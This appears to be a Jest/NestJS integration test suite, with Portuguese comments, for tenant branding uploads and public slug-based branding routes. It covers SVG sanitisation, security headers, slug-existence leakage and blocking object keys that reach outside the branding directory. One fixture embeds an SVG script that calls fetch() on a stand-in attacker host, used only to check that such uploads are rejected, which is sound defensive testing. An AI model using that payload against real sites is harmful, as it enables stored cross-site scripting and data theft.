import { randomUUID } from 'node:crypto';

import { afterAll, beforeAll, describe, expect, it } from '@jest/globals';
import type { INestApplication } from '@nestjs/common';
import { Test } from '@nestjs/testing';
import request from 'supertest';

import { AppModule } from '../../src/app.module.js';
import type { PlatformContext } from '../../src/common/platform/platform-context.js';
import {
  OBJECT_STORAGE,
  type ObjectStoragePort,
} from '../../src/common/storage/object-storage.port.js';
import { PasswordService } from '../../src/modules/auth/password.service.js';
import { BrandingService } from '../../src/modules/platform/branding.service.js';
import { CriarTenantUseCase } from '../../src/modules/platform/criar-tenant.use-case.js';
import { PrismaService } from '../../src/persistence/prisma.service.js';

const SVG_LIMPO =
  '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/></svg>';

const SVG_COM_SCRIPT =
  '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("https://mau.example/roubo")</script></svg>';

function bytesDeSvg(conteudo: string): Uint8Array {
  return new Uint8Array(Buffer.from(conteudo, 'utf-8'));
}

function bytesDePng(): Uint8Array {
  const buffer = new Uint8Array(64);

  [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a].forEach((byte, indice) => {
    buffer[indice] = byte;
  });

  return buffer;
}

/**
 * Identidade visual do tenant e login por slug -- F62 (ADR-052 §9 e §10).
 *
 * Fala com MinIO de verdade: a rota publica le os bytes DE VOLTA do storage,
 * e um dublê de storage que devolve o que recebeu provaria so que o objeto
 * atravessou a memoria do processo -- nao que ele foi gravado sob a chave
 * certa e recuperado por ela.
 */
describe('identidade visual do tenant', () => {
  let app: INestApplication;
  let db: PrismaService;
  let senhas: PasswordService;
  let branding: BrandingService;
  let criar: CriarTenantUseCase;

  let contexto: PlatformContext;

  /*
   * `getHttpServer()` devolve `any` no Nest, e a lint recusa passar `any`
   * adiante. Mesmo estreitamento que `auth.int-spec.ts` ja usa -- um `as` num
   * lugar so, em vez de um por chamada.
   */
  const servidor = (): Parameters<typeof request>[0] =>
    app.getHttpServer() as Parameters<typeof request>[0];

  const criarTenantDeTeste = async (): Promise<{ id: string; slug: string }> => {
    const slug = `marca-${randomUUID().slice(0, 8)}`;

    const { tenantId } = await criar.executar(
      contexto,
      {
        slug,
        legalName: 'Academia da Marca LTDA',
        displayName: 'Academia da Marca',
        cnpj: '12345678000199',
        timezone: 'America/Sao_Paulo',
        responsavelNome: 'Fulano',
        responsavelEmail: `dono-${randomUUID().slice(0, 8)}@academia.local`,
        unidade: { code: 'MATRIZ', name: 'Matriz', timezone: 'America/Sao_Paulo' },
      },
      `corr-${randomUUID()}`,
    );

    return { id: tenantId, slug };
  };

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({ imports: [AppModule] }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    db = app.get(PrismaService);
    senhas = app.get(PasswordService);
    branding = app.get(BrandingService);
    criar = app.get(CriarTenantUseCase);

    const usuario = await db.user.create({
      data: {
        email: `super-marca-${randomUUID().slice(0, 8)}@exemplo.test`,
        // Hash de verdade: a suite `vazamento` varre a tabela inteira.
        passwordHash: await senhas.gerarHash('senha-de-teste-correta'),
      },
    });

    const admin = await db.platformAdmin.create({ data: { userId: usuario.id } });

    contexto = { actorId: usuario.id, sessionId: randomUUID(), platformAdminId: admin.id };
  });

  afterAll(async () => {
    await app?.close();
  });

  /** O aceite da issue #285, ponta a ponta. */
  it('recusa SVG com script e nao grava nada', async () => {
    const tenant = await criarTenantDeTeste();

    await expect(
      branding.substituir(tenant.id, 'icon', {
        contentType: 'image/svg+xml',
        conteudo: bytesDeSvg(SVG_COM_SCRIPT),
      }),
    ).rejects.toMatchObject({ code: 'SVG_UNSAFE_CONTENT' });

    /*
     * A COLUNA CONTINUA VAZIA. Sem esta asserção o teste passaria mesmo que o
     * servico gravasse o arquivo no bucket e so depois lancasse -- o payload
     * ficaria la, e a recusa seria teatro.
     */
    const depois = await db.tenant.findUniqueOrThrow({
      where: { id: tenant.id },
      select: { iconObjectKey: true },
    });

    expect(depois.iconObjectKey).toBeNull();
  });

  it('aceita SVG limpo e o serve de volta pela rota publica', async () => {
    const tenant = await criarTenantDeTeste();

    await branding.substituir(tenant.id, 'icon', {
      contentType: 'image/svg+xml',
      conteudo: bytesDeSvg(SVG_LIMPO),
    });

    const resposta = await request(servidor())
      .get(`/api/v1/branding/${tenant.slug}/icon`)
      .expect(200);

    expect(resposta.headers['content-type']).toContain('image/svg+xml');
    // Os cabecalhos SAO a segunda trava: sem eles um SVG que escapasse da
    // sanitizacao executaria na origem que o serviu.
    expect(resposta.headers['x-content-type-options']).toBe('nosniff');
    expect(resposta.headers['content-security-policy']).toContain('sandbox');
    // `.body` e nao `.text`: o supertest so preenche `.text` para os tipos
    // que ele sabe parsear, e `image/svg+xml` nao e um deles -- os bytes
    // chegam como Buffer.
    expect(Buffer.from(resposta.body).toString('utf-8')).toContain('<circle');
  });

  it('aceita PNG como alternativa ao SVG', async () => {
    const tenant = await criarTenantDeTeste();

    const { objectKey } = await branding.substituir(tenant.id, 'logo', {
      contentType: 'image/png',
      conteudo: bytesDePng(),
    });

    expect(objectKey).toBe(`tenants/${tenant.id}/branding/logo.png`);

    await request(servidor())
      .get(`/api/v1/branding/${tenant.slug}/logo`)
      .expect(200)
      .expect('Content-Type', /image\/png/);
  });

  it('devolve missao e diferenciais do tenant pelo slug', async () => {
    const tenant = await criarTenantDeTeste();

    await db.tenant.update({
      where: { id: tenant.id },
      data: { missionText: 'Treinar todo mundo.', highlightsText: 'Quadra de areia e box.' },
    });

    const resposta = await request(servidor())
      .get(`/api/v1/branding/${tenant.slug}`)
      .expect(200);

    expect(resposta.body).toMatchObject({
      slug: tenant.slug,
      displayName: 'Academia da Marca',
      missionText: 'Treinar todo mundo.',
      highlightsText: 'Quadra de areia e box.',
      temLogo: false,
      temIcone: false,
    });
  });

  /**
   * O SEGUNDO ACEITE da issue: "slug inexistente cai na marca ArenaHub sem
   * vazar que o slug nao existe".
   *
   * A prova NAO e "responde 200": e que a resposta e IDENTICA a de um tenant
   * que existe mas esta fora de operacao. Se as duas divergissem em qualquer
   * campo -- inclusive no status HTTP --, a tela de login viraria um oraculo
   * de "esta academia e cliente do ArenaHub".
   */
  it('nao distingue slug inexistente de tenant fora de operacao', async () => {
    const desligado = await criarTenantDeTeste();

    await db.tenant.update({ where: { id: desligado.id }, data: { status: 'INACTIVE' } });

    const inexistente = await request(servidor())
      .get(`/api/v1/branding/nao-existe-${randomUUID().slice(0, 8)}`)
      .expect(200);

    const foraDeOperacao = await request(servidor())
      .get(`/api/v1/branding/${desligado.slug}`)
      .expect(200);

    expect(foraDeOperacao.body).toEqual(inexistente.body);
    expect(inexistente.body).toMatchObject({ displayName: 'ArenaHub', temLogo: false });
  });

  /**
   * O TENANT DESLIGADO TAMBEM NAO SERVE ARQUIVO -- nem o que ja tinha
   * enviado. Sem esta regra, o `GET .../logo` responderia 200 para o suspenso
   * e 404 para o inexistente, e o status da resposta entregaria de graca o
   * que o corpo do teste anterior esconde com cuidado.
   */
  it('para de servir o arquivo quando o tenant sai de operacao', async () => {
    const tenant = await criarTenantDeTeste();

    await branding.substituir(tenant.id, 'logo', {
      contentType: 'image/png',
      conteudo: bytesDePng(),
    });

    await request(servidor()).get(`/api/v1/branding/${tenant.slug}/logo`).expect(200);

    await db.tenant.update({ where: { id: tenant.id }, data: { status: 'SUSPENDED' } });

    await request(servidor()).get(`/api/v1/branding/${tenant.slug}/logo`).expect(404);
  });

  it('responde 404 para peca que o tenant nunca enviou', async () => {
    const tenant = await criarTenantDeTeste();

    await request(servidor()).get(`/api/v1/branding/${tenant.slug}/icon`).expect(404);
  });

  /**
   * A CHECAGEM DE PERTENCIMENTO, no caminho que ela existe para barrar.
   *
   * A chave sai de uma coluna do banco. Escrevendo ali o caminho da foto
   * biometrica de um aluno -- que mora no MESMO bucket --, a rota publica a
   * serviria a quem soubesse o slug, se ela confiasse na coluna.
   */
  it('recusa chave que aponta para fora do diretorio de marca', async () => {
    const tenant = await criarTenantDeTeste();

    await db.tenant.update({
      where: { id: tenant.id },
      data: { logoObjectKey: `tenants/${tenant.id}/biometrics/aluno-qualquer/enrollment` },
    });

    await request(servidor()).get(`/api/v1/branding/${tenant.slug}/logo`).expect(404);
  });

  /**
   * TROCAR DE FORMATO NAO PODE DEIXAR ORFAO. O `logo.png` e o `logo.svg` sao
   * chaves diferentes: sem o apagamento, cada academia que trocasse de
   * formato deixaria um arquivo no bucket que nenhuma linha referencia.
   */
  it('apaga o arquivo anterior quando a extensao muda', async () => {
    const tenant = await criarTenantDeTeste();

    await branding.substituir(tenant.id, 'logo', {
      contentType: 'image/png',
      conteudo: bytesDePng(),
    });

    await branding.substituir(tenant.id, 'logo', {
      contentType: 'image/svg+xml',
      conteudo: bytesDeSvg(SVG_LIMPO),
    });

    const depois = await db.tenant.findUniqueOrThrow({
      where: { id: tenant.id },
      select: { logoObjectKey: true },
    });

    expect(depois.logoObjectKey).toBe(`tenants/${tenant.id}/branding/logo.svg`);

    // O PNG antigo saiu do bucket: a leitura direta pela chave velha falha.
    const storage = app.get<ObjectStoragePort>(OBJECT_STORAGE);

    await expect(
      storage.getPrivateObject(`tenants/${tenant.id}/branding/logo.png`),
    ).rejects.toBeDefined();
  });
});
